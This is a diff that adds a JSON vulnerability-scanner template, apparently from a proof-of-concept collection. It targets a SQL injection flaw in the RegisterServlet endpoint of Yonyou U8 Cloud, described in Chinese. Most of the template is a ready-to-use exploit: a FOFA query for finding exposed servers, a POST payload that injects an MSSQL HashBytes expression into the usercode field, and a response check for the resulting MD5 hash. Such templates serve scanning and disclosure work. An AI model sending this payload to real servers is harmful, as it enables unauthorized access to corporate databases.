@@ -1,0 +1,34 @@
+{
+  "product": "用友U8 Cloud",
+  "vul_name": "用友U8 Cloud RegisterServlet SQL注入",
+  "type": "SQL注入",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "U8 cloud集中于企业内部管理管控，管理规范，高效，协同，透明。通过云模式，低成本，快速部署，即租即用帮助企业免除硬软件投入的快速 搭建企业管理架构。通过云服务连接，业务模式、服务模式的经营创新。该产品RegisterServlet处存在SQL注入",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "app=\"用友-U8-Cloud\""
+  },
+  "protocol": "http",
+  "link": "https://blog.csdn.net/qq_53003652/article/details/134400953",
+  "fix": [],
+  "exploit": {
+    "exp": {
+      "method": "post",
+      "follow": false,
+      "path": "/servlet/RegisterServlet",
+      "data": "usercode=1' and substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32)>0--"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "e10adc3949ba59abbe56e057f20f883e"
+        }
+      ]
+    }
+  }
+}
